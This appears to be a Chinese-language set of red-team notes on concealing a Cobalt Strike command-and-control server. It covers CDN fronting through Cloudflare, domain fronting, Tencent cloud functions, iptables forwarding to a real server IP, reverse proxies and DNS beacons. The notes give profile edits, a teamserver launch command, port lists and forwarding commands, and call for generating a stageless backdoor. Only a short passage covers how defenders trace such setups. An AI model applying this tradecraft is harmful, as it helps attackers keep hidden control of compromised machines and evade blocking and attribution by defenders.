CDN，域名被禁了也遭了。
域前置（过时）
云函数
端口转发，代理

## **常规CDN**
域名解析到cloudflare，cloudflare的节点ip转发到cs的真实ip。
下载c2文件模版，修改配置并上传cs根目录。
```
修改.profile文件中
http-get下的:
uri "/jquery-3.3.1.min.js";

header "Host" "www.域名.xyz";
header "Referer" "http://www.域名.xyz/"
```
启动 CS 加载 CS 模版 /teamserver 47.94.236.117 xxiaodi 指定.profile
使用 stag 生成后门即可。
```
http地址：www.域名.xyz
http地址(Stager)：www.域名.xyz
http host头：www.域名.xyz
```

注意 1：
因为 cloudflare 的原因这里端口的设置需要注意以下：
若是 http，则只能设置 80,8080,8880,2052,2082,2086,2095 这些端口号
若是 https，则只能设置 443,2053,2083,2087,2096,8443 这些端口号
注意 2：
后门生成使用 Stageless 模式


缺点：域名被禁了也遭了
^
## **域前置**
CS服务器绑定域名A.com最先，然后域名解析到CDN，CDN再到CS服务器，CDN结点上有其他的域名（CDN节点的ip反域名），用这个其他的域名作为CS木马域名，https的host填自己真实的域名A.com，当我们请求一个部署了CDN服务的域名时，实际上也默认使用了云厂商内部的解析器。而云厂商内部的解析器，实际会根据Header中的Host字段判断回源域名，最后效果是，请求内容以Host字段为准。实现连接到自己CS服务器。
![image-20240429105257029](http://cdn.33129999.xyz/mk_img/image-20240429105257029.png)

缺点：很多CDN不支持。
溯源思路：
1.因为A.com是用的CDN服务回源恶意ip，A.com必定暴露在公网上。既然在公网上存在，就必定会被空间资产测绘所检测到，通过对比测绘的界面和从CDN端返回的数据包进行对比，Banner信息测绘，从而缩小范围，直至定位到具体地址。
2.逆向木马，解密https（难），查看真实host。

## **云函数**
腾讯云的云函数服务
可以提供python3.6监听的端口和腾讯云域名。
用这个云函数转发到CS服务端，而CS服务端配置好profile文件，CS客户端生成监听器为腾讯云的域名，即可。
且ip会变，封禁ip无效。域名为腾讯云官方域名，有欺骗性。
    

## **用代理服务器端口转发**
转发机设置转发：（https：80改443即可）
```
iptables -I INPUT -p tcp -m tcp--dport 80 -j ACCEPT 
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 47.94.236.117:80
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
```
这些命令的组合配置了一台 Linux 服务器作为网络网关，允许外部 HTTP 流量通过端口 80 进入，并将这些流量转发到另一个指定的 IP 地址（47.94.236.117）上的 80 端口。同时，它还设置了系统允许数据包在不同网络接口之间转发。这种配置通常用于搭建代理服务器、负载均衡器或 VPN 服务器。

## **反向代理**
利用apache,nginx等。

## **域名解析DNS**
1、xxx.com域名的子域名解析设置 A,NS 记录
ns1 ns cs.xxx.com
ns2 ns cs.xxx.com  备用
cs A xx.xx.xx.xx(CS服务端 的 IP)

2、CS 监听器-DNS
Beacon DNS
DNS 地址配置：
ns1.xxx.com
ns2.xxx.com

3、上线后
执行后 checkin 唤醒


此时查目的ip是DNS服务器的ip，不是CS服务端ip。
